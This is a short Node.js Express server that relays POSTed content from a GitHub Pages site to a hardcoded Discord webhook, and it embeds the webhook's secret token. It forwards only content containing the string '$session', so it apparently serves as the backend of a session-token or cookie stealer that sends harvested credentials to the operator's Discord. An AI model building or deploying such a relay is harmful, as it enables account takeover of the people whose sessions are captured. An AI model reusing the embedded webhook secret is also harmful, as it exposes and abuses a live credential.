const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch'); // Make sure to install node-fetch@2 for CommonJS compatibility
const app = express();

const PORT = process.env.PORT || 10000;
const DISCORD_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1363135609601917199/-XCwFzteRcZQW5u98yN9oP86P55-kaErK8QNP8m4p7eaTH1GTuRbaewg9qnx-ljs9J-k';

app.use(cors({
  origin: 'https://impatientzz.github.io', // Your frontend URL here (GitHub pages)
}));
app.use(express.json());

app.post('/send-webhook', async (req, res) => {
  const { content } = req.body;

  if (!content || !content.includes('$session')) {
    return res.status(400).json({ error: 'Invalid content' });
  }

  try {
    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content }),
    });

    if (!discordRes.ok) {
      const errorText = await discordRes.text();
      return res.status(500).json({ error: `Discord webhook error: ${errorText}` });
    }

    res.json({ message: 'Webhook sent successfully' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/', (req, res) => {
  res.send('Backend proxy server is running!');
});

app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
